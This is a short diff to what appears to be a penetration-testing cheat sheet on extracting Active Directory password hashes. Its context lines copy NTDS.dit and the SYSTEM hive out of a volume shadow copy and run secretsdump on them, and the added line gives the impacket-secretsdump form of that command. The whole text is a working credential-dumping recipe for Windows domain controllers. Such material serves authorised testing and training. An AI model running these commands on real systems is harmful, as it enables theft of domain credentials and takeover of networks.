@@ -6,6 +6,7 @@ vssadmin create shadow /for=C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
 secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
+impacket-secretsdump -ntds NTDS.dit -system  SYSTEM LOCAL
 ```
 
 ### ntdsutil
